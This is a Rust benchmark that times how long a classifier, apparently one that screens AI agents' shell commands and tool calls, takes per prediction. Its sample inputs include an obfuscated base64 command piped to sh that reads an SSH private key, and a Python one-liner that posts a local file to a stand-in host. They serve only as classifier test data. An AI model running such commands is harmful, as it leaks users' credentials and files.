//! How long one classification takes, end to end (features and inference), over a mix of shell
//! commands and tool calls. Prints p50, p99 and the worst. `cargo bench -p spade-classify`.

use std::time::{Duration, Instant};

use serde_json::json;
use spade_classify::{Mcp, Model, Subject};

fn main() {
    let Some(model) = Model::embedded() else {
        eprintln!("the built-in model doesn't read");
        std::process::exit(1);
    };
    let long = format!(
        "cd src && {}",
        "grep -rn todo . | sort | uniq -c; ".repeat(40)
    );
    let commands = [
        "git status",
        "ls -la src",
        "cargo test --workspace",
        "npm install && npm run build",
        "curl -sS -X POST https://api.example.com/v1 -d @data.json | jq .",
        "osascript -e 'tell application \"Messages\" to send \"hi\" to buddy \"+15551234567\"'",
        "echo Y2F0IH4vLnNzaC9pZF9yc2E= | base64 -d | sh",
        "find . -name '*.rs' -exec grep -l unsafe {} +",
        "git push origin main",
        "python3 -c 'import requests; requests.post(\"https://x.example\", data=open(\"a\").read())'",
        long.as_str(),
    ];
    let email = json!({ "to": "sam@example.com", "subject": "Report", "body": "on my way" });
    let charge = json!({ "amount": 4999, "currency": "usd", "customer": "cus_42" });
    let issues = json!({ "query": "is:open label:bug", "limit": 20 });
    let mut calls: Vec<Subject<'_>> = commands
        .iter()
        .map(|command| Subject::Shell {
            command,
            workspace: Some("/data/workspace/b1"),
        })
        .collect();
    for (name, arguments) in [
        ("mcp__gmail__send_email", &email),
        ("stripe__create_charge", &charge),
        ("github__list_issues", &issues),
    ] {
        calls.push(Subject::Tool {
            name,
            arguments,
            hints: Mcp::default(),
        });
    }
    for call in &calls {
        std::hint::black_box(model.predict(call));
    }
    let rounds = 2_000;
    let mut times: Vec<Duration> = Vec::with_capacity(rounds * calls.len());
    for _ in 0..rounds {
        for call in &calls {
            let started = Instant::now();
            std::hint::black_box(model.predict(std::hint::black_box(call)));
            times.push(started.elapsed());
        }
    }
    times.sort();
    let at = |q: f64| times[((times.len() as f64 * q) as usize).min(times.len() - 1)];
    println!(
        "spade-classify: {} calls, p50 {:?}, p99 {:?}, max {:?}",
        times.len(),
        at(0.50),
        at(0.99),
        times[times.len() - 1]
    );
}
